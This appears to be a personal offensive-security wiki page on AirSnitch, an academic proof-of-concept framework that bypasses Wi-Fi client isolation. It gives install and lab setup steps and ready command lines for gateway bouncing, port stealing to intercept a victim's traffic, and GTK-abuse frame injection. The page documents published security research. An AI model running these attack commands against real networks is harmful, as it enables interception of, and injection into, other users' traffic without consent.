---
title: AirSnitch (macstealer)
permalink: /wiki/offsec-notes/entities/airsnitch/
layout: single
author_profile: true
tags:
- offsec-notes
- tool
---

**Type:** Tool / PoC Framework
**Also known as:** macstealer
**Related:** [Wi Fi Client Isolation Bypass](/wiki/offsec-notes/concepts/wi-fi-client-isolation-bypass/), [Wireless Attacks](/wiki/offsec-notes/concepts/wireless-attacks/)

## Description
AirSnitch is the open-source proof-of-concept framework released alongside the NDSS 2026 paper "AirSnitch: Demystifying and Breaking Wi-Fi Client Isolation" (Zhou, Pu, Liu, Qian, Tan, Krishnamurthy, Vanhoef — UCR / KU Leuven). It implements three Wi-Fi client isolation bypass techniques: gateway bouncing, port stealing, and GTK abuse. Uses Python with a multi-process architecture; also ships setup scripts using `mac80211_hwsim` for lab testing without physical wireless hardware.

**Repositories:**
- https://github.com/zhouxinan/airsnitch
- https://github.com/vanhoefm/airsnitch (mirror)
- Artifact archive: https://doi.org/10.5281/zenodo.17905486

## Usage / Details

### Dependencies
```bash
sudo apt install libnl-3-dev libnl-genl-3-dev libnl-route-3-dev \
  libssl-dev libdbus-1-dev pkg-config build-essential git python3-venv \
  aircrack-ng rfkill net-tools dnsmasq tcpreplay macchanger
```

### Setup
```bash
# One-time setup
./setup.sh                          # terminal A — starts virtual Wi-Fi environment

cd macstealer/research
./build.sh && ./pysetup.sh          # terminal B — build + Python venv

# Before each test run
sudo su && source venv/bin/activate # both terminals
```

### Core Script: `macstealer.py`

**Gateway Bouncing** (inject across BSSIDs via IP-layer routing):
```bash
python3 macstealer.py wlan2 --c2c-ip wlan3 --other-bss --no-ssid-check \
  --config client-simulated-AE-gatewaybouncing.conf
# Success: "Client to client traffic at IP layer is allowed"
```

**Port Stealing** (intercept victim's downlink traffic):
```bash
python3 macstealer.py wlan2 --c2c-port-steal wlan3 --other-bss --no-ssid-check \
  --config client-simulated-AE-portsteal.conf --server 192.168.100.X
# Success: "Downlink port stealing is successful."
```

**GTK Abuse** (inject unicast-in-broadcast directly to victim):
```bash
# WPA3 victim BSSID
python3 macstealer.py wlan2 --c2c-gtk-inject wlan3 --other-bss --no-ssid-check \
  --config client-simulated-AE-gtkabuse.conf --no-id-check --c2m-mon-channel 6
# Success: "GTK wrapping ICMP ping is allowed"

# WPA2 victim BSSID
python3 macstealer.py wlan2 --c2c-gtk-inject wlan3 --other-bss --no-ssid-check \
  --config client-simulated-AE-gtkabuse2.conf --no-id-check --c2m-mon-channel 1
```

### Multi-Process Architecture
The MitM framework uses:
- **Main controller** — executes port stealing
- **Frame capture subprocess** — captures intercepted frames
- **Re-encryption subprocess** — re-encrypts with GTK
- **Frame injection subprocess** — injects frames back to victim

Injection NIC tested: Alfa AWUS036ACM. Performance at 10 Mbps UDP: ~1.7% loss (near AP), ~7% (through wall). End-to-end success rate: 5/5 in all tested scenarios.

### Lab Environment
Uses `mac80211_hwsim` kernel module — simulates multiple wireless NICs without physical hardware. Setup scripts create AP pairs with configurable encryption:
- `setup-br0-gwbounce.sh` — two APs (WPA3-Personal + WPA2-Personal) with `ap_isolate=1`
- `setup-br0-portsteal.sh` — same topology for port stealing tests
- `setup-br0-gtkabuse.sh` — same topology for GTK abuse tests

## Notable Versions / Variants
- Paper released at NDSS 2026 (February 23–27, San Diego)
- Artifact archived at Zenodo (doi.org/10.5281/zenodo.17905486)
- Targets validated: 11 real AP models (home + enterprise), 2 university WPA2-Enterprise networks

## References
- AirSnitch: Demystifying and Breaking Wi-Fi Client Isolation — Zhou et al., NDSS 2026
